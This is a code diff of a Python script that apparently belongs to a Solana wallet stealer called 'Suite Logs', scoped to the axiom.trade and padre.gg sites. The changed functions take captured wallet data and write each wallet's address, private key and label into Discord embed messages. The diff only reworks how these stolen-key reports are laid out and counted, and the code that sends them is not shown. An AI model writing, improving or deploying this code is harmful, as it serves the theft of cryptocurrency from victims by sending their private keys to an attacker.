@@ -31,7 +31,7 @@ ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
 
 BRAND        = "Suite Logs"
 SOL_COLOR    = 0x14F195
-DESC_LIMIT   = 4000   # Discord embed description cap
+DESC_LIMIT   = 4000
 
 
 def decode_b64url(s: str) -> str:
@@ -80,12 +80,11 @@ def normalize_wallets(parsed: dict) -> list:
     return stubs
 
 
-def build_lines(parsed: dict) -> list:
-    """One line per Solana wallet."""
+def build_description(parsed: dict) -> tuple[str, int]:
     keys    = parsed.get("keys", []) or []
     wallets = normalize_wallets(parsed)
 
-    lines = []
+    blocks = []
     n = 0
     for i, w in enumerate(wallets):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
@@ -97,29 +96,32 @@ def build_lines(parsed: dict) -> list:
         label = (w[5] if len(w) > 5 else "") or "—"
         key   = keys[i] if i < len(keys) else "not recovered"
         n += 1
-        lines.append(
-            f"`Adresse Solana` : `{addr}` : `Private Key` : `{key}` : `Label` : `{label}` : `Wal {n}`"
+        blocks.append(
+            f"**Wal {n}**  ·  Label : `{label}`\n"
+            f"Adresse Solana : `{addr}`\n"
+            f"Private Key : `{key}`"
         )
-    return lines
+
+    if not blocks:
+        return "`no SOL wallet recovered`", 0
+
+    desc = "\n\n".join(blocks)
+    if len(desc) > DESC_LIMIT:
+        desc = desc[: DESC_LIMIT - 1] + "…"
+    return desc, n
 
 
 def build_embeds(parsed: dict) -> list:
-    host    = parsed.get("host", "?")
-    lines   = build_lines(parsed)
+    host = parsed.get("host", "?")
+    desc, count = build_description(parsed)
 
-    if not lines:
-        return [{
-            "title": f"{BRAND} · {host}",
-            "color": SOL_COLOR,
-            "description": f"`no SOL wallet recovered`",
-        }]
-
-    desc = "\n".join(lines)
-    if len(desc) > DESC_LIMIT:
-        desc = desc[: DESC_LIMIT - 1] + "…"
+    if count == 0:
+        title = f"{BRAND} · {host}"
+    else:
+        title = f"{BRAND} · {host} · {count} SOL"
 
     return [{
-        "title": f"{BRAND} · {host} · {len(lines)} SOL",
+        "title": title,
         "color": SOL_COLOR,
         "description": desc,
         "footer": {"text": BRAND},
